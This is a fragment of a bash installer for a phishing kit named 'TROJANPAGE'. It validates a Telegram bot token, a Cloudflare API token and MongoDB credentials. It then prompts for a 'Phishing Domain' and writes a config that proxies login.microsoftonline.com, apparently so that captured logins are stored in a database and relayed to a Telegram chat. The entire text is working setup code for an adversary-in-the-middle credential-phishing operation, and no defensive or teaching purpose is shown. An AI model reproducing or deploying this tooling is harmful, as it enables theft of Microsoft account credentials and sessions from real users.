# --- 4. VERIFIED CONFIGURATION WIZARD ---
echo -e "\n${BLUE}--- [ TROJANPAGE: CONFIGURATION WIZARD ] ---${NC}"
echo -e "${BLUE}[!] System will verify each credential before proceeding.${NC}\n"

# A. TELEGRAM VALIDATION
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -ne "[...] Validating Telegram Bot..."
    CHECK_TG=$(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe")
    if [[ $CHECK_TG == *"\"ok\":true"* ]]; then
        echo -e "${GREEN} [VERIFIED]${NC}"
        break
    else
        echo -e "${RED} [FAILED] Token is invalid. Try again.${NC}"
    fi
done
read -p "Enter Telegram Chat ID: " TG_ID

# B. CLOUDFLARE VALIDATION
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    echo -ne "[...] Validating Cloudflare Permissions..."
    CHECK_CF=$(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
         -H "Authorization: Bearer $CF_TOKEN" \
         -H "Content-Type:application/json")
    if [[ $CHECK_CF == *"\"status\":\"active\""* ]]; then
        echo -e "${GREEN} [VERIFIED]${NC}"
        break
    else
        echo -e "${RED} [FAILED] Token is dead or lacks permissions.${NC}"
    fi
done

# C. MONGODB ATLAS / REMOTE VALIDATION
sudo apt update && sudo apt install -y mongodb-clients > /dev/null 2>&1
while true; do
    echo -e "\n${BLUE}[ MongoDB Settings ]${NC}"
    read -p "Enter MongoDB Host (e.g. cluster0.abc.mongodb.net): " M_HOST
    read -p "Enter MongoDB User: " M_USER
    read -p "Enter MongoDB Pass: " M_PASS
    echo -ne "[...] Pinging MongoDB Cluster..."
    
    # Validation for Atlas (+srv)
    if mongosh "mongodb+srv://$M_USER:$M_PASS@$M_HOST/admin" --eval "db.adminCommand('listDatabases')" > /dev/null 2>&1; then
        echo -e "${GREEN} [CONNECTED]${NC}"
        M_URI="mongodb+srv://$M_USER:$M_PASS@$M_HOST/trojan_db?retryWrites=true&w=majority"
        break
    else
        echo -e "${RED} [FAILED] Could not connect. Check Host/User/Pass.${NC}"
    fi
done

# D. DOMAIN SETUP
read -p "Enter Your Phishing Domain (e.g., login-microsoft.com): " USER_DOMAIN

# --- 5. SAVE FINAL CONFIGURATION ---
echo -e "${BLUE}[+] Generating Secure Config...${NC}"
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "mongodb": "$M_URI"
}
EOF

echo -e "${GREEN}[success] All credentials verified and saved to /root/config.json${NC}"
